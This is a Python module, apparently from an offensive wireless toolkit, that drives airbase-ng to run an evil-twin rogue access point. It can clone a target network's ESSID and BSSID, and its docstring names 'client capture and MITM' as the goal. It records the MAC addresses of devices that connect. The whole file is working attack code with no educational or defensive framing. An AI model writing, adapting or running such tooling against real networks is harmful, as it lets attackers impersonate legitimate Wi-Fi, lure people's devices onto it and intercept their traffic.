#!/usr/bin/env python3
"""
wifi_rogue_ap — Rogue AP / Evil Twin via airbase-ng.

CLI deps: airbase-ng (aircrack-ng suite on Kali)

Creates a rogue access point (evil twin) for client capture and MITM.
Runs for a specified duration and reports connected clients.

REQUIRES: Root privileges, monitor-mode interface.
"""

import json
import os
import re
import time

from base_module import TacticalModule


class WiFiRogueAP(TacticalModule):
    name = "wifi_rogue_ap"
    description = "Rogue AP / Evil Twin via airbase-ng"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--essid", required=True,
            help="ESSID for the rogue AP",
        )
        self.parser.add_argument(
            "--interface", required=True,
            help="Monitor-mode wireless interface",
        )
        self.parser.add_argument(
            "--channel", type=int, default=6,
            help="Channel for the rogue AP (default: 6)",
        )
        self.parser.add_argument(
            "--bssid",
            help="Spoof this BSSID (clone target AP's MAC)",
        )
        self.parser.add_argument(
            "--duration", type=int, default=120,
            help="Duration to run rogue AP in seconds (default: 120)",
        )
        self.parser.add_argument(
            "--wpa",
            help="WPA passphrase (creates encrypted rogue AP)",
        )

    def run(self, args) -> None:
        if not self.validate_interface(args.interface):
            self.output_error(f"Invalid interface: {args.interface}")
            return
        if not self.check_root():
            return
        if args.bssid and not self.validate_mac(args.bssid):
            self.output_error(f"Invalid BSSID: {args.bssid}")
            return

        # Build airbase-ng command
        ab_args = [
            "-e", args.essid,
            "-c", str(args.channel),
        ]
        if args.bssid:
            ab_args.extend(["-a", args.bssid])
        if args.wpa:
            ab_args.extend(["-W", "1", "-z", "2"])  # WPA1 TKIP

        ab_args.append(args.interface)

        start = time.monotonic()
        stdout, stderr = self.run_tool_popen(
            "airbase-ng", ab_args, duration=args.duration
        )
        duration_ms = int((time.monotonic() - start) * 1000)

        clients = self._parse_clients(stdout + stderr)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0, stdout[:5000], stderr[:5000], duration_ms,
        )
        self.output_success({
            "essid": args.essid,
            "channel": args.channel,
            "interface": args.interface,
            "spoofed_bssid": args.bssid,
            "clients_seen": clients,
            "client_count": len(clients),
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_clients(output: str) -> list[dict]:
        """Parse airbase-ng output for connected clients."""
        clients: list[dict] = []
        seen_macs: set[str] = set()

        for line in output.split("\n"):
            # Client connected: XX:XX:XX:XX:XX:XX
            mac_match = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
            if mac_match:
                mac = mac_match.group(1).upper()
                if mac not in seen_macs and "BSSID" not in line:
                    seen_macs.add(mac)
                    clients.append({
                        "mac": mac,
                        "info": line.strip()[:200],
                    })
        return clients


if __name__ == "__main__":
    WiFiRogueAP().execute()
